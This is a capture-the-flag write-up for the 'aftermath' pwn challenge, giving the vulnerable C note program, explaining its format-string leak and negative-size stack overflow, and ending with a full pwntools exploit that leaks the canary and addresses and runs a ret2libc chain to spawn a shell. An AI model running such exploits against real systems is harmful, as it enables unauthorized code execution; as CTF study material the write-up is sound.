This challenge was really cool. it had 22 solves.
We are given the source code in this challenge:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


// gcc -fstack-protector-all -o aftermath aftermath.c

#define MAX_NOTES 10
#define MAX_NOTE_SIZE 0xff


struct Note {
	int size;
	char* note;
};

struct Note* note_storage[MAX_NOTES];


void error(char* err_msg) {
	puts(err_msg);
	exit(1);
}

int get_int() {
	char buf[8];
	unsigned int res = fgets(buf, 8, stdin);
	if (res == 0) {
		error("invalid int");
	}
	return atoi(&buf);

}

unsigned int count_notes() {
	for (int i = 0; i < MAX_NOTES; i++) {
		if (note_storage[i] == NULL) return i;
	}
	return MAX_NOTES;
}


void add_note() {
	unsigned int note_count = count_notes();
	if (note_count == MAX_NOTES) {
		puts("Max note capacity reached");
		return;
	}

	struct Note* note = (struct Note*) malloc(sizeof(struct Note));
	note_storage[note_count] = note;

	printf("Size: ");
	int size = get_int();

	if (abs(size) >= MAX_NOTE_SIZE) {
		error("Notes that big are currently not supported!");
	} else if (size == 0) {
		error("Can't store nothing");
	}

	char* data = (char*) malloc(abs(size));
	printf("Note: ");
	fgets(data, abs(size), stdin);
	note->size = size;
	note->note = data;

	puts("Note added!");
}

void read_note() {
	printf("Index: ");
	unsigned int index = get_int();
	unsigned int count = count_notes();

	if (index < count) {
		struct Note* cnote = note_storage[index];
		printf("Note: ");
		printf(cnote->note);
	} else {
		error("Note does not exist!");
	}
}

void edit_note() {
	char edit_buf[MAX_NOTE_SIZE];

	printf("Index: ");
	unsigned int index = get_int();
	unsigned int count = count_notes();

	if (index < count) {
		struct Note* cnote = note_storage[index];
		printf("New Note: ");
		read(0, edit_buf, cnote->size);
		strncpy(cnote->note, edit_buf, abs(cnote->size));
	} else {
		error("Note does not exist!");
	}
}

void menu() {
	puts("1. Add note");
	puts("2. Read note");
	puts("3. Edit note");
	puts("4. Exit");

	printf("> ");
}



int main() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);

	puts("******** Insane note book app trust me ********");
	
	while (1) {
		menu();
		unsigned int choice = get_int();
		if (choice == 1) {
			add_note();
		} else if (choice == 2) {
			read_note();
		} else if (choice == 3) {
			edit_note();
		} else if (choice == 4) {
			return 0;
		} else {
			error("invalid choice");
		}
	}
}

```

The binary is compiled with all the mitegations:
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  '.'
```

After searching for some bugs, I have found a few things:
in the `read_note` function, there is an fsb bug - this can lead to all the leaks we need (libc, PIE, canary, stack) , and a potential arbitrary write primitive(not really, since the buffer is in the heap)
In the `add_note` function, there is a weird bfferoverflow:
we can enter a size, and it checks if `abs(size) < 0xff` , which is equivelent to `-0xff < size < 0xff`. this means we can enter negative sizes.
then a `fgets` will be called on our `data` in the heap. the chunk is of size `abs(size)`, and the fgets is reading `abs(size)` aswell so everything is ok.
BUT, when it saves the new note to the global array, it saves `size` as the size, and not `abs(size)`. this can leak to unexpected behaviour. lets see where it uses this struct member:

```c
void edit_note() {
	char edit_buf[MAX_NOTE_SIZE];

	printf("Index: ");
	unsigned int index = get_int();
	unsigned int count = count_notes();

	if (index < count) {
		struct Note* cnote = note_storage[index];
		printf("New Note: ");
		read(0, edit_buf, cnote->size);
		strncpy(cnote->note, edit_buf, abs(cnote->size));
	} else {
		error("Note does not exist!");
	}
}
```

as you can see, it will get our index, and reach to our note struct. then, it will read from the user `note->size` bytes. but remember that `note->size` is a negative number,but `read` takes an unsigned int as a paramater, so we have a huge bof here.
Then I basiclly used the leak stack canary, and did a basic ret2libc and jumped to `system(/bin/sh)`.

Full exploit:

```
from pwn import *

e = ELF('./aftermath')
libc = ELF('./libc.so.6')


if args.GDB:
    p = gdb.debug("./aftermath")
elif args.REMOTE:
    p = remote('aftermath-0.chals.kitctf.de', 1337, ssl=True) # TODO: Proper domain
else:
    p = process("./aftermath")

count = 0

def add_note(size, note):
    global count
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil('Size: ')
    p.sendline(str(size))
    p.recvuntil('Note: ')
    p.sendline(str(note))
    p.recvline()
    count+=1
    return count-1

def read_note(idx):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil('Index: ')
    p.sendline(str(idx))
    p.recvuntil('Note: ')
    return p.recvuntil('1.').replace(b'1.', b'')[:-1]

def edit_note(idx, note):
    p.recvuntil('> ')
    p.sendline('3')
    p.recvuntil('Index: ')
    p.sendline(str(idx))
    p.recvuntil('New Note: ')
    p.send(note)

def arb_write(what, where, n):
    write_note = add_note(n, w)


leak_note = add_note(0xff - 1, "%1$p|%15$p|%11$p|%9$p")
stack, libc_leak, pie, canary = [int(i, 16) for i in read_note(leak_note).split(b'|')]

libc.address = libc_leak - 0x23510
e.address = pie - 0x1778
main_ret_address = stack + 0x2168

POPRDI = e.address + 0x0000000000001823 #pop rdi ; ret
RET = e.address + 0x000000000000101a #align stack for system

print(hex(libc.address), hex(e.address), hex(main_ret_address))

overflow_note = add_note(-100, 'A')

BINSH = next(libc.search(b"/bin/sh"))
SYSTEM = libc.sym["system"]

print(hex(BINSH), hex(SYSTEM))

rop_chain = 264 * b'A' + p64(canary) + b"BBBBBBBB" + p64(POPRDI) + p64(BINSH) + p64(RET) +  p64(SYSTEM)

print(rop_chain)
edit_note(overflow_note, rop_chain)





p.interactive()

```

